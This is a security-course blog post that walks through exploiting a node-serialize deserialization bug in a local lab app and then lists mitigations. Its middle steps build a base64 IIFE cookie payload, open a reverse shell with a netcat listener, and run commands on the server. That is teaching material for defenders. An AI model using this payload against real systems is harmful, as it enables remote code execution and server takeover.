---
layout: post
title: Insecure Deserialization & Insufficient Logging & Monitoring
---

# Insecure Deserialization
Serialization is the process where an object is encoded into a byte-stream which can be transferred across a network. It is then de-serialized to recover the object. Depending on the application, serialized objects may include executable instructions or authentication credentials. These serialized objects may be modified by an adversary. If the application is not able to detect tampering, it can allow the adversary to achieve effects like remote code execution or privilege escalation on the server.

We will be exploiting a known vulnerability of node-serialize discussed in last week's post.      
>**Vulnerability:** Untrusted data passed into unserialize() function in node-serialize module can be exploited to achieve arbitrary code execution by passing a serialized JavaScript Object with an Immediately invoked function expression (IIFE). Specifically the vulnerability in the web app is that it reads a cookie named profile from the HTTP request, perform base64 decode of the cookie value and passes it to unserialize() function. As cookie is an untrusted input, an attacker can craft malicious cookie value to exploit this vulnerability. <sub>[1]</sub>

### Exercise 
**Note:** Since this exercise gains access into the server we are unable to exploit the live vulnerable web app hosted in Heroku as they have added security on their back-end to prevent these kinds of attacks.    

1. Setup: 
- Clone or download https://github.com/ajinabraham/Node.Js-Security-Course.git
- On a seperate folder clone or download https://github.com/ashwinsawant/sbr.git and checkout branch Deserial with 'git checkout Deserial' command.   
- Download postgresql from https://www.postgresql.org/download/
- Enter postgresql and run the following commands to create the database.
``` CREATE DATABASE sbr;
 \c sbr

CREATE TABLE users (
uid  SERIAL PRIMARY KEY, 
email varchar (40) NOT NULL, 
password varchar (250) NOT NULL, 
attempts integer DEFAULT 0
);

INSERT INTO users(email, password)
VALUES ('cocho@gmail.com', 'password'),
('ash@yahoo.com', 'pass123'),
('sal@msn.com', 'qwerty'),
('user123@gmail.com', '123user'),
('janedoe@yahoo.com', 'monkey'),
('jhondoe@hotmail.com', 'dragon');

CREATE TABLE lists (
lid SERIAL PRIMARY KEY, 
uid integer, 
list_name varchar (40),
FOREIGN KEY (uid) REFERENCES users(uid)
); 

INSERT INTO lists (uid, list_name)
VALUES ('1','Groceries'),
('1','Homework'),
('2','Errands'),
('3','Hardware');

CREATE TABLE items (
iid SERIAL PRIMARY KEY, 
lid integer, 
item_name varchar (40),
FOREIGN KEY (lid) REFERENCES lists(lid)
); 

INSERT INTO items (lid, item_name)
VALUES ('1','eggs'),
('1','apples'),
('2','Add tables'),
('2','Populate passwords'),
('3','Laundry'),
('3','Vacuum'),
('4','Hammer'),
('4','Screw driver');
```
- Run command 'npm start' to run web app locally on port 3000. 

     ![Local Host](/images/week8_npmStart.JPG)

2. Open Burp, go to Proxy > Options and make sure 127.0.0.1:8080 Proxy Listener is enabled. Then go to Firefox and change manual proxy settings to match Burp's.

     ![Burp Proxy](/images/week8_Proxy.JPG)

3. On Burp go to Proxy > Intercept and make sure Intercept is on. On Firefox go to localhost:3000/login and enter the following credentials at the login page: **Email:** cocho@gmail.com and **Password:** password      
Read carefully after GET you will see an api/login click Forward and then you will see a GET /setCookies, this is the request we are interested in.  We have just intercepted traffic and now have access to the encryted cookie along with the request format. Click on Action button and Send to Repeater. We will use later on in the process.   

   ![Burp Intercept](/images/week8_Cookie.JPG)

4. Go to the Node.Js-Security-Course folder and open the terminal and run the following command: `python nodejsshell.py 127.0.0.1 3333`
Copy text everything starting at `eval(`  and paste it in Burp's Decoder tab. 

   ![Python Scrypt](/images/week8_python.JPG)
   
5. Copy paste or type the following on the Decoder tab before eval `{"rce":"_$$ND_FUNC$$_function (){ ` and copy paste or type `}()"}` at the end after 10)) Click on Encode as and select Base 64 to get a long string of characters. 

    ![Decoder](/images/week8_base64.JPG)

6. Open a terminal and type `nc -l 127.0.0.1 3333`.  Looks like nothing is happening but give it a minute while we run the rest of the exploit. 

7. Copy the encoded string and got to the Repeater tab, replace the red text after profile= with the string and click Send. You should get a Response 302 Found and a message Redirecting like the image below. 

   ![Repeater Redirecting](/images/week8_Redirecting.JPG)   
   
8. Go back to the terminal where you entered `nc -l 127.0.0.1 3333` and you will see a Connected! message. Here are a few commands you can try      
`ls` list directory contents.      
`whoami` It displays the username of the current user.      
`pwd` Print Working Directory. It prints the path of the working directory, starting from the root.     
`uname -r` Used to get information about current operating system. In this case the Linux kernel version.     
`cat /etc/os-release` Name, version of Operating System.     
`exit` Get out of shell and back into working directory.     

   ![Shell](/images/week8_Connected.JPG)   

**[Video of Insecure Deserialization on localhost](https://media.oregonstate.edu/media/t/0_1e1lfvl2)**

### Analysis
Do not to accept serialized objects from untrusted sources or to use serialization mediums that only permit primitive data types. If that is not possible, consider the following:     
- Implementing integrity checks such as digital signatures on any serialized objects to prevent hostile object creation or data tampering.
- Enforcing strict type constraints during deserialization before object creation as the code typically expects a definable set of classes. Bypasses to this technique have been demonstrated, so reliance solely on this is not advisable.
- Isolating and running code that deserializes in low privilege environments when possible.
- Logging deserialization exceptions and failures, such as where the incoming type is not the expected type, or the deserialization throws exceptions.
- Restricting or monitoring incoming and outgoing network connectivity from containers or servers that deserialize.
Monitoring deserialization, alerting if a user deserializes constantly. <sub>[2]</sub>

### References
1. <https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/>
2. <https://hdivsecurity.com/owasp-insecure-deserialization> 
3. <https://github.com/ajinabraham/Node.Js-Security-Course>
4. <https://expressjs.com/en/resources/middleware/cookie-parser.html>
5. <https://www.yeahhub.com/nodejs-deserialization-attack-detailed-tutorial-2018/>

# Insufficient Logging & Monitoring
